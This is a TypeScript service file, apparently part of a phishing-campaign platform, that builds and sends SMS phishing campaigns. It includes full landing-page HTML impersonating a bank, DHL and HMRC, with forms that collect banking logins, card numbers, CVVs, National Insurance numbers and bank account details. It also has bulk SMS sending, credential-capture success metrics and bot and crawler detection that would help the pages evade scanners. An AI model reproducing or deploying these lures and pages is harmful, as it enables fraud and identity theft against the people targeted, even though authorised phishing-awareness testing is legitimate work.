import { Campaign, Session } from '@shared/schema';
import { storage } from './storage';
import { smsService } from './smsService';

export interface MobileCampaignConfiguration {
  id: string;
  name: string;
  description: string;
  type: 'sms_phishing' | 'mobile_app_phishing' | 'qr_code_phishing' | 'mobile_landing' | 'push_notification';
  
  // Target configuration
  targets: {
    mobileNumbers: string[];
    deviceTypes: ('ios' | 'android' | 'all')[];
    carriers: string[];
    geographicTargets: string[];
  };
  
  // Campaign content
  content: {
    smsMessage?: string;
    landingPageUrl?: string;
    qrCodeData?: string;
    appStoreUrl?: string;
    deepLinkUrl?: string;
    pushNotificationText?: string;
  };
  
  // Mobile-specific settings
  mobileSettings: {
    responsiveDesign: boolean;
    mobileOptimizedForms: boolean;
    touchFriendlyInterface: boolean;
    deviceFingerprinting: boolean;
    locationTracking: boolean;
    accelerometerDetection: boolean;
    cameraAccess: boolean;
    geolocationAccess: boolean;
  };
  
  // Social engineering tactics
  socialEngineering: {
    urgencyLevel: 'low' | 'medium' | 'high' | 'critical';
    authority: 'bank' | 'government' | 'employer' | 'service_provider' | 'personal';
    pretext: string;
    credibilityIndicators: string[];
    psychologicalTriggers: ('fear' | 'greed' | 'curiosity' | 'authority' | 'urgency' | 'social_proof')[];
  };
  
  // Mobile security evasion
  evasionTechniques: {
    userAgentSpoofing: boolean;
    screenSizeAdaptation: boolean;
    touchEventSimulation: boolean;
    mobileBrowserDetection: boolean;
    appDeepLinking: boolean;
    mobileRedirection: boolean;
  };
}

export interface MobileTemplate {
  id: string;
  name: string;
  category: 'banking_app' | 'delivery_sms' | 'social_media' | 'tax_refund' | 'security_alert' | 'app_update';
  platform: 'ios' | 'android' | 'cross_platform';
  
  // SMS component
  smsTemplate: {
    message: string;
    variables: string[];
    fromName: string;
    urgencyLevel: number; // 1-10
  };
  
  // Landing page component
  landingPage: {
    mobileHtml: string;
    cssFramework: 'bootstrap' | 'tailwind' | 'custom';
    formFields: MobileFormField[];
    credentialCapture: boolean;
    mfaCapture: boolean;
  };
  
  // App simulation
  appSimulation: {
    appName: string;
    iconUrl: string;
    packageName: string;
    minimumOSVersion: string;
    permissions: string[];
    screenshots: string[];
  };
}

export interface MobileFormField {
  id: string;
  type: 'text' | 'email' | 'password' | 'tel' | 'number' | 'date' | 'select' | 'file';
  label: string;
  placeholder: string;
  required: boolean;
  mobileKeyboard: 'default' | 'numeric' | 'email' | 'phone' | 'url';
  autoComplete: string;
  sensitive: boolean; // PII/credentials
}

export interface MobileSessionData {
  sessionId: string;
  deviceInfo: {
    userAgent: string;
    screenResolution: string;
    devicePixelRatio: number;
    touchSupport: boolean;
    platform: 'ios' | 'android' | 'other';
    browser: string;
    isEmulator: boolean;
  };
  locationData?: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: Date;
  };
  behaviorMetrics: {
    touchEvents: number;
    scrollEvents: number;
    orientationChanges: number;
    averageInputSpeed: number;
    formCompletionTime: number;
  };
  appInteraction?: {
    deepLinkClicked: boolean;
    appStoreRedirect: boolean;
    installAttempted: boolean;
    permissionsRequested: string[];
  };
}

export interface MobileCampaignMetrics {
  campaignId: string;
  totalTargets: number;
  smsDelivered: number;
  landingPageVisits: number;
  formSubmissions: number;
  credentialsCaptured: number;
  appInstallAttempts: number;
  mobileDeviceBreakdown: {
    ios: number;
    android: number;
    other: number;
  };
  carrierBreakdown: { [carrier: string]: number };
  geographicDistribution: { [country: string]: number };
  successRate: number;
  averageSessionDuration: number;
}

export class MobileCampaignService {
  private templates: Map<string, MobileTemplate> = new Map();
  private campaigns: Map<string, MobileCampaignConfiguration> = new Map();
  private mobileMetrics: Map<string, MobileCampaignMetrics> = new Map();

  constructor() {
    this.initializeMobileTemplates();
  }

  private initializeMobileTemplates(): void {
    const templates: MobileTemplate[] = [
      {
        id: 'banking_app_ios',
        name: 'Banking App Security Alert (iOS)',
        category: 'banking_app',
        platform: 'ios',
        smsTemplate: {
          message: 'Your {BANK_NAME} mobile app requires urgent security update. Download now to secure your account: {LINK}',
          variables: ['BANK_NAME', 'LINK'],
          fromName: '{BANK_NAME} Security',
          urgencyLevel: 8
        },
        landingPage: {
          mobileHtml: this.generateBankingAppHTML('ios'),
          cssFramework: 'custom',
          formFields: [
            {
              id: 'username',
              type: 'text',
              label: 'Online Banking ID',
              placeholder: 'Enter your banking ID',
              required: true,
              mobileKeyboard: 'default',
              autoComplete: 'username',
              sensitive: true
            },
            {
              id: 'password',
              type: 'password',
              label: 'Password',
              placeholder: 'Enter your password',
              required: true,
              mobileKeyboard: 'default',
              autoComplete: 'current-password',
              sensitive: true
            },
            {
              id: 'touch_id',
              type: 'text',
              label: 'Touch ID Verification',
              placeholder: 'Touch the sensor',
              required: false,
              mobileKeyboard: 'default',
              autoComplete: 'off',
              sensitive: false
            }
          ],
          credentialCapture: true,
          mfaCapture: true
        },
        appSimulation: {
          appName: 'Banking Security Update',
          iconUrl: '/assets/bank-icon.png',
          packageName: 'com.banking.security',
          minimumOSVersion: '12.0',
          permissions: ['camera', 'location', 'biometric'],
          screenshots: ['/assets/bank-app-1.png', '/assets/bank-app-2.png']
        }
      },
      {
        id: 'delivery_sms_android',
        name: 'Package Delivery Notification (Android)',
        category: 'delivery_sms',
        platform: 'android',
        smsTemplate: {
          message: 'Delivery attempted - {COURIER}. Your package requires £{FEE} redelivery fee. Pay now: {LINK} Tracking: {TRACKING}',
          variables: ['COURIER', 'FEE', 'LINK', 'TRACKING'],
          fromName: '{COURIER}',
          urgencyLevel: 6
        },
        landingPage: {
          mobileHtml: this.generateDeliveryHTML('android'),
          cssFramework: 'bootstrap',
          formFields: [
            {
              id: 'fullname',
              type: 'text',
              label: 'Full Name',
              placeholder: 'Enter full name',
              required: true,
              mobileKeyboard: 'default',
              autoComplete: 'name',
              sensitive: true
            },
            {
              id: 'address',
              type: 'text',
              label: 'Delivery Address',
              placeholder: 'Enter your address',
              required: true,
              mobileKeyboard: 'default',
              autoComplete: 'street-address',
              sensitive: true
            },
            {
              id: 'card_number',
              type: 'tel',
              label: 'Card Number',
              placeholder: '1234 5678 9012 3456',
              required: true,
              mobileKeyboard: 'numeric',
              autoComplete: 'cc-number',
              sensitive: true
            },
            {
              id: 'cvv',
              type: 'tel',
              label: 'CVV',
              placeholder: '123',
              required: true,
              mobileKeyboard: 'numeric',
              autoComplete: 'cc-csc',
              sensitive: true
            }
          ],
          credentialCapture: true,
          mfaCapture: false
        },
        appSimulation: {
          appName: 'Courier Tracking',
          iconUrl: '/assets/delivery-icon.png',
          packageName: 'com.courier.tracking',
          minimumOSVersion: '7.0',
          permissions: ['location', 'camera'],
          screenshots: ['/assets/delivery-app-1.png']
        }
      },
      {
        id: 'tax_refund_cross',
        name: 'Tax Refund Notification (Cross-Platform)',
        category: 'tax_refund',
        platform: 'cross_platform',
        smsTemplate: {
          message: 'HMRC: You have a tax refund of £{AMOUNT} pending. Claim within 30 days: {LINK} Ref: {REF}',
          variables: ['AMOUNT', 'LINK', 'REF'],
          fromName: 'HMRC',
          urgencyLevel: 7
        },
        landingPage: {
          mobileHtml: this.generateTaxRefundHTML(),
          cssFramework: 'tailwind',
          formFields: [
            {
              id: 'ni_number',
              type: 'text',
              label: 'National Insurance Number',
              placeholder: 'AB 12 34 56 C',
              required: true,
              mobileKeyboard: 'default',
              autoComplete: 'off',
              sensitive: true
            },
            {
              id: 'dob',
              type: 'date',
              label: 'Date of Birth',
              placeholder: 'DD/MM/YYYY',
              required: true,
              mobileKeyboard: 'numeric',
              autoComplete: 'bday',
              sensitive: true
            },
            {
              id: 'sort_code',
              type: 'tel',
              label: 'Bank Sort Code',
              placeholder: '12-34-56',
              required: true,
              mobileKeyboard: 'numeric',
              autoComplete: 'off',
              sensitive: true
            },
            {
              id: 'account_number',
              type: 'tel',
              label: 'Account Number',
              placeholder: '12345678',
              required: true,
              mobileKeyboard: 'numeric',
              autoComplete: 'off',
              sensitive: true
            }
          ],
          credentialCapture: true,
          mfaCapture: false
        },
        appSimulation: {
          appName: 'HMRC Mobile',
          iconUrl: '/assets/hmrc-icon.png',
          packageName: 'uk.gov.hmrc.mobile',
          minimumOSVersion: '8.0',
          permissions: ['camera', 'storage'],
          screenshots: ['/assets/hmrc-app-1.png', '/assets/hmrc-app-2.png']
        }
      }
    ];

    templates.forEach(template => {
      this.templates.set(template.id, template);
    });
  }

  private generateBankingAppHTML(platform: string): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banking Security Update</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0; 
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            min-height: 100vh;
            padding: 20px;
        }
        .container { 
            max-width: 400px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 12px; 
            padding: 30px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .bank-logo { 
            text-align: center; 
            margin-bottom: 30px; 
            font-size: 24px; 
            color: #1e3c72; 
            font-weight: bold;
        }
        .security-alert { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            padding: 15px; 
            border-radius: 8px; 
            margin-bottom: 20px;
            text-align: center;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: 500; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #ddd; 
            border-radius: 8px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus { 
            border-color: #1e3c72; 
            outline: none; 
        }
        .submit-btn { 
            width: 100%; 
            background: #1e3c72; 
            color: white; 
            padding: 15px; 
            border: none; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: 600;
            margin-top: 20px;
        }
        .security-features {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="bank-logo">🏦 SecureBank Mobile</div>
        <div class="security-alert">
            <strong>Security Update Required</strong><br>
            Please verify your credentials to download the latest security update.
        </div>
        <form id="mobileForm">
            <div class="form-group">
                <label for="username">Online Banking ID</label>
                <input type="text" id="username" name="username" autocomplete="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" autocomplete="current-password" required>
            </div>
            ${platform === 'ios' ? `
            <div class="form-group">
                <label for="touch_id">Touch ID Verification</label>
                <input type="text" id="touch_id" name="touch_id" placeholder="Touch the sensor" readonly>
            </div>
            ` : ''}
            <button type="submit" class="submit-btn">Secure My Account</button>
        </form>
        <div class="security-features">
            🔒 256-bit SSL encryption<br>
            🛡️ Advanced fraud protection<br>
            📱 Mobile app security enhanced
        </div>
    </div>
    <script>
        // Mobile behavior tracking
        let touchEvents = 0;
        let scrollEvents = 0;
        
        document.addEventListener('touchstart', () => touchEvents++);
        document.addEventListener('scroll', () => scrollEvents++);
        
        document.getElementById('mobileForm').addEventListener('submit', function(e) {
            e.preventDefault();
            // Capture form data and behavioral metrics
            window.location.href = '/success';
        });
    </script>
</body>
</html>`;
  }

  private generateDeliveryHTML(platform: string): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Package Redelivery</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f8f9fa; }
        .delivery-container { max-width: 400px; margin: 20px auto; }
        .delivery-card { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .delivery-header { text-align: center; margin-bottom: 20px; color: #dc3545; }
        .tracking-info { background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        .fee-amount { font-size: 24px; font-weight: bold; color: #dc3545; text-align: center; }
    </style>
</head>
<body>
    <div class="delivery-container">
        <div class="delivery-card">
            <div class="delivery-header">
                <h4>📦 Delivery Update</h4>
                <p class="text-muted">DHL Express</p>
            </div>
            <div class="tracking-info">
                <strong>Tracking:</strong> DHL1234567890<br>
                <strong>Status:</strong> Delivery Failed<br>
                <strong>Reason:</strong> Recipient not available
            </div>
            <div class="fee-amount mb-3">Redelivery Fee: £1.99</div>
            <form id="deliveryForm">
                <div class="mb-3">
                    <label class="form-label">Full Name</label>
                    <input type="text" class="form-control" name="fullname" required>
                </div>
                <div class="mb-3">
                    <label class="form-label">Delivery Address</label>
                    <input type="text" class="form-control" name="address" required>
                </div>
                <div class="mb-3">
                    <label class="form-label">Card Number</label>
                    <input type="tel" class="form-control" name="card_number" placeholder="1234 5678 9012 3456" required>
                </div>
                <div class="row">
                    <div class="col-8">
                        <label class="form-label">Expiry Date</label>
                        <input type="text" class="form-control" name="expiry" placeholder="MM/YY" required>
                    </div>
                    <div class="col-4">
                        <label class="form-label">CVV</label>
                        <input type="tel" class="form-control" name="cvv" placeholder="123" required>
                    </div>
                </div>
                <button type="submit" class="btn btn-danger w-100 mt-3">Pay £1.99 & Schedule Redelivery</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('deliveryForm').addEventListener('submit', function(e) {
            e.preventDefault();
            window.location.href = '/redelivery-scheduled';
        });
    </script>
</body>
</html>`;
  }

  private generateTaxRefundHTML(): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HMRC Tax Refund</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
    <div class="max-w-md mx-auto p-4">
        <div class="bg-white rounded-lg shadow-lg p-6">
            <div class="text-center mb-6">
                <div class="text-3xl mb-2">🏛️</div>
                <h2 class="text-xl font-bold text-green-700">HM Revenue & Customs</h2>
                <p class="text-sm text-gray-600">Tax Refund Service</p>
            </div>
            <div class="bg-green-50 border border-green-200 rounded p-4 mb-6">
                <h3 class="font-semibold text-green-800">Tax Refund Available</h3>
                <p class="text-sm text-green-700">You are entitled to a refund of <strong>£284.50</strong></p>
                <p class="text-xs text-green-600 mt-1">Reference: HMRC-TR-2024-001856</p>
            </div>
            <form id="hmrcForm">
                <div class="mb-4">
                    <label class="block text-sm font-medium mb-1">National Insurance Number</label>
                    <input type="text" class="w-full p-3 border rounded-lg" name="ni_number" placeholder="AB 12 34 56 C" required>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium mb-1">Date of Birth</label>
                    <input type="date" class="w-full p-3 border rounded-lg" name="dob" required>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium mb-1">Bank Sort Code</label>
                    <input type="tel" class="w-full p-3 border rounded-lg" name="sort_code" placeholder="12-34-56" required>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium mb-1">Account Number</label>
                    <input type="tel" class="w-full p-3 border rounded-lg" name="account_number" placeholder="12345678" required>
                </div>
                <button type="submit" class="w-full bg-green-600 text-white p-3 rounded-lg font-semibold">
                    Claim Tax Refund
                </button>
            </form>
            <div class="text-xs text-gray-500 text-center mt-4">
                🔒 Secure government service
            </div>
        </div>
    </div>
    <script>
        document.getElementById('hmrcForm').addEventListener('submit', function(e) {
            e.preventDefault();
            window.location.href = '/refund-processing';
        });
    </script>
</body>
</html>`;
  }

  async createMobileCampaign(config: MobileCampaignConfiguration): Promise<string> {
    console.log(`Creating mobile campaign: ${config.name}`);
    
    // Validate configuration
    await this.validateMobileCampaign(config);
    
    // Store campaign
    this.campaigns.set(config.id, config);
    
    // Initialize metrics
    const metrics: MobileCampaignMetrics = {
      campaignId: config.id,
      totalTargets: config.targets.mobileNumbers.length,
      smsDelivered: 0,
      landingPageVisits: 0,
      formSubmissions: 0,
      credentialsCaptured: 0,
      appInstallAttempts: 0,
      mobileDeviceBreakdown: { ios: 0, android: 0, other: 0 },
      carrierBreakdown: {},
      geographicDistribution: {},
      successRate: 0,
      averageSessionDuration: 0
    };
    
    this.mobileMetrics.set(config.id, metrics);
    
    return config.id;
  }

  private async validateMobileCampaign(config: MobileCampaignConfiguration): Promise<void> {
    if (config.targets.mobileNumbers.length === 0) {
      throw new Error('Mobile campaign must have at least one target number');
    }

    if (config.type === 'sms_phishing' && !config.content.smsMessage) {
      throw new Error('SMS phishing campaign requires SMS message content');
    }

    if (config.type === 'mobile_landing' && !config.content.landingPageUrl) {
      throw new Error('Mobile landing campaign requires landing page URL');
    }

    // Validate phone numbers
    for (const number of config.targets.mobileNumbers) {
      if (!this.isValidMobileNumber(number)) {
        throw new Error(`Invalid mobile number: ${number}`);
      }
    }
  }

  private isValidMobileNumber(number: string): boolean {
    // Basic mobile number validation
    const cleanNumber = number.replace(/\D/g, '');
    return cleanNumber.length >= 10 && cleanNumber.length <= 15;
  }

  async executeMobileCampaign(campaignId: string): Promise<void> {
    const campaign = this.campaigns.get(campaignId);
    if (!campaign) {
      throw new Error(`Campaign not found: ${campaignId}`);
    }

    const metrics = this.mobileMetrics.get(campaignId)!;
    
    console.log(`Executing mobile campaign: ${campaign.name}`);

    try {
      switch (campaign.type) {
        case 'sms_phishing':
          await this.executeSMSPhishingCampaign(campaign, metrics);
          break;
        case 'qr_code_phishing':
          await this.executeQRCodeCampaign(campaign, metrics);
          break;
        case 'mobile_app_phishing':
          await this.executeMobileAppCampaign(campaign, metrics);
          break;
        case 'mobile_landing':
          await this.executeMobileLandingCampaign(campaign, metrics);
          break;
        case 'push_notification':
          await this.executePushNotificationCampaign(campaign, metrics);
          break;
      }

      console.log(`Mobile campaign executed successfully: ${campaignId}`);
    } catch (error) {
      console.error(`Mobile campaign execution failed: ${campaignId}`, error);
      throw error;
    }
  }

  private async executeSMSPhishingCampaign(campaign: MobileCampaignConfiguration, metrics: MobileCampaignMetrics): Promise<void> {
    if (!campaign.content.smsMessage) return;

    // Send SMS messages to all targets
    for (const mobileNumber of campaign.targets.mobileNumbers) {
      try {
        await smsService.sendSMS(mobileNumber, campaign.content.smsMessage);
        metrics.smsDelivered++;
      } catch (error) {
        console.error(`Failed to send SMS to ${mobileNumber}:`, error);
      }
    }
  }

  private async executeQRCodeCampaign(campaign: MobileCampaignConfiguration, metrics: MobileCampaignMetrics): Promise<void> {
    // Generate QR codes and setup mobile tracking
    console.log(`Generating QR codes for campaign: ${campaign.id}`);
    
    // In production, would generate actual QR codes with tracking
    const qrCodeUrl = `https://qr-api.com/generate?data=${encodeURIComponent(campaign.content.qrCodeData || '')}`;
    console.log(`QR Code URL: ${qrCodeUrl}`);
  }

  private async executeMobileAppCampaign(campaign: MobileCampaignConfiguration, metrics: MobileCampaignMetrics): Promise<void> {
    console.log(`Setting up mobile app phishing for campaign: ${campaign.id}`);
    
    // Setup app store redirects and mobile app simulation
    if (campaign.content.appStoreUrl) {
      console.log(`App Store URL configured: ${campaign.content.appStoreUrl}`);
    }
  }

  private async executeMobileLandingCampaign(campaign: MobileCampaignConfiguration, metrics: MobileCampaignMetrics): Promise<void> {
    console.log(`Configuring mobile landing page for campaign: ${campaign.id}`);
    
    // Setup mobile-optimized landing pages
    if (campaign.content.landingPageUrl) {
      console.log(`Landing page URL: ${campaign.content.landingPageUrl}`);
    }
  }

  private async executePushNotificationCampaign(campaign: MobileCampaignConfiguration, metrics: MobileCampaignMetrics): Promise<void> {
    console.log(`Setting up push notifications for campaign: ${campaign.id}`);
    
    // Configure push notification delivery
    if (campaign.content.pushNotificationText) {
      console.log(`Push notification: ${campaign.content.pushNotificationText}`);
    }
  }

  async trackMobileSession(sessionData: MobileSessionData): Promise<void> {
    console.log(`Tracking mobile session: ${sessionData.sessionId}`);
    
    // Analyze device information
    const deviceAnalysis = this.analyzeMobileDevice(sessionData.deviceInfo);
    
    // Track behavioral metrics
    const behaviorAnalysis = this.analyzeMobileBehavior(sessionData.behaviorMetrics);
    
    // Store session data
    // In production, would store in database
    console.log('Mobile session analysis:', { deviceAnalysis, behaviorAnalysis });
  }

  private analyzeMobileDevice(deviceInfo: any): any {
    return {
      isMobile: deviceInfo.touchSupport,
      platform: deviceInfo.platform,
      isEmulator: deviceInfo.isEmulator,
      suspiciousUserAgent: this.detectSuspiciousUserAgent(deviceInfo.userAgent),
      screenAnomalies: this.detectScreenAnomalies(deviceInfo.screenResolution, deviceInfo.devicePixelRatio)
    };
  }

  private analyzeMobileBehavior(behaviorMetrics: any): any {
    return {
      humanLikeBehavior: behaviorMetrics.touchEvents > 5 && behaviorMetrics.scrollEvents > 2,
      inputSpeedNormal: behaviorMetrics.averageInputSpeed > 50 && behaviorMetrics.averageInputSpeed < 300,
      formCompletionRealistic: behaviorMetrics.formCompletionTime > 30,
      mobileGesturesDetected: behaviorMetrics.touchEvents > 0
    };
  }

  private detectSuspiciousUserAgent(userAgent: string): boolean {
    const suspiciousPatterns = [
      'bot', 'crawler', 'spider', 'automation', 'headless',
      'phantom', 'selenium', 'puppeteer'
    ];
    
    return suspiciousPatterns.some(pattern => 
      userAgent.toLowerCase().includes(pattern)
    );
  }

  private detectScreenAnomalies(resolution: string, pixelRatio: number): boolean {
    // Detect unusual screen configurations that might indicate automation
    const [width, height] = resolution.split('x').map(Number);
    
    // Check for common mobile screen sizes
    const commonMobileSizes = [
      [375, 667], [414, 896], [360, 640], [412, 915], // iOS/Android common sizes
    ];
    
    const isCommonSize = commonMobileSizes.some(([w, h]) => 
      Math.abs(width - w) < 50 && Math.abs(height - h) < 50
    );
    
    return !isCommonSize || pixelRatio < 1 || pixelRatio > 4;
  }

  async generateMobileReport(campaignId: string): Promise<string> {
    const campaign = this.campaigns.get(campaignId);
    const metrics = this.mobileMetrics.get(campaignId);
    
    if (!campaign || !metrics) {
      throw new Error(`Campaign or metrics not found: ${campaignId}`);
    }

    return `
# Mobile Campaign Report: ${campaign.name}

## Campaign Overview
- **Type**: ${campaign.type.replace('_', ' ').toUpperCase()}
- **Targets**: ${metrics.totalTargets} mobile numbers
- **Success Rate**: ${metrics.successRate.toFixed(1)}%

## Mobile Metrics
- **SMS Delivered**: ${metrics.smsDelivered}/${metrics.totalTargets}
- **Landing Page Visits**: ${metrics.landingPageVisits}
- **Form Submissions**: ${metrics.formSubmissions}
- **Credentials Captured**: ${metrics.credentialsCaptured}
- **App Install Attempts**: ${metrics.appInstallAttempts}

## Device Breakdown
- **iOS**: ${metrics.mobileDeviceBreakdown.ios}
- **Android**: ${metrics.mobileDeviceBreakdown.android}
- **Other**: ${metrics.mobileDeviceBreakdown.other}

## Geographic Distribution
${Object.entries(metrics.geographicDistribution).map(([country, count]) => 
  `- **${country}**: ${count} interactions`
).join('\n')}

## Social Engineering Analysis
- **Urgency Level**: ${campaign.socialEngineering.urgencyLevel}
- **Authority Pretext**: ${campaign.socialEngineering.authority}
- **Psychological Triggers**: ${campaign.socialEngineering.psychologicalTriggers.join(', ')}

## Mobile Security Findings
- **Average Session Duration**: ${metrics.averageSessionDuration.toFixed(1)} seconds
- **Mobile-Optimized**: ${campaign.mobileSettings.responsiveDesign ? 'Yes' : 'No'}
- **Touch Interface**: ${campaign.mobileSettings.touchFriendlyInterface ? 'Yes' : 'No'}
- **Device Fingerprinting**: ${campaign.mobileSettings.deviceFingerprinting ? 'Enabled' : 'Disabled'}

Generated on ${new Date().toLocaleString()}
    `.trim();
  }

  // Public API methods
  getTemplates(): MobileTemplate[] {
    return Array.from(this.templates.values());
  }

  getTemplate(templateId: string): MobileTemplate | undefined {
    return this.templates.get(templateId);
  }

  getCampaign(campaignId: string): MobileCampaignConfiguration | undefined {
    return this.campaigns.get(campaignId);
  }

  getCampaignMetrics(campaignId: string): MobileCampaignMetrics | undefined {
    return this.mobileMetrics.get(campaignId);
  }

  getCampaigns(): MobileCampaignConfiguration[] {
    return Array.from(this.campaigns.values());
  }

  async updateCampaignMetrics(campaignId: string, updates: Partial<MobileCampaignMetrics>): Promise<void> {
    const metrics = this.mobileMetrics.get(campaignId);
    if (metrics) {
      Object.assign(metrics, updates);
      
      // Recalculate success rate
      metrics.successRate = metrics.totalTargets > 0 ? 
        (metrics.credentialsCaptured / metrics.totalTargets) * 100 : 0;
    }
  }

  async getMobileStatistics(): Promise<any> {
    const campaigns = Array.from(this.campaigns.values());
    const metrics = Array.from(this.mobileMetrics.values());
    
    const totalCampaigns = campaigns.length;
    const totalTargets = metrics.reduce((sum, m) => sum + m.totalTargets, 0);
    const totalCredentials = metrics.reduce((sum, m) => sum + m.credentialsCaptured, 0);
    const avgSuccessRate = metrics.length > 0 ? 
      metrics.reduce((sum, m) => sum + m.successRate, 0) / metrics.length : 0;

    return {
      totalCampaigns,
      totalTargets,
      totalCredentials,
      averageSuccessRate: avgSuccessRate.toFixed(1),
      mostEffectiveType: this.getMostEffectiveCampaignType(),
      platformDistribution: this.getPlatformDistribution(),
      lastCampaign: campaigns.sort((a, b) => 
        new Date(b.id).getTime() - new Date(a.id).getTime()
      )[0]
    };
  }

  private getMostEffectiveCampaignType(): string {
    const typeMetrics: { [type: string]: number[] } = {};
    
    for (const campaign of this.campaigns.values()) {
      const metrics = this.mobileMetrics.get(campaign.id);
      if (metrics) {
        if (!typeMetrics[campaign.type]) {
          typeMetrics[campaign.type] = [];
        }
        typeMetrics[campaign.type].push(metrics.successRate);
      }
    }

    let bestType = 'sms_phishing';
    let bestRate = 0;

    for (const [type, rates] of Object.entries(typeMetrics)) {
      const avgRate = rates.reduce((sum, rate) => sum + rate, 0) / rates.length;
      if (avgRate > bestRate) {
        bestRate = avgRate;
        bestType = type;
      }
    }

    return bestType.replace('_', ' ').toUpperCase();
  }

  private getPlatformDistribution(): any {
    const distribution = { ios: 0, android: 0, other: 0 };
    
    for (const metrics of this.mobileMetrics.values()) {
      distribution.ios += metrics.mobileDeviceBreakdown.ios;
      distribution.android += metrics.mobileDeviceBreakdown.android;
      distribution.other += metrics.mobileDeviceBreakdown.other;
    }

    return distribution;
  }
}

export const mobileCampaignService = new MobileCampaignService();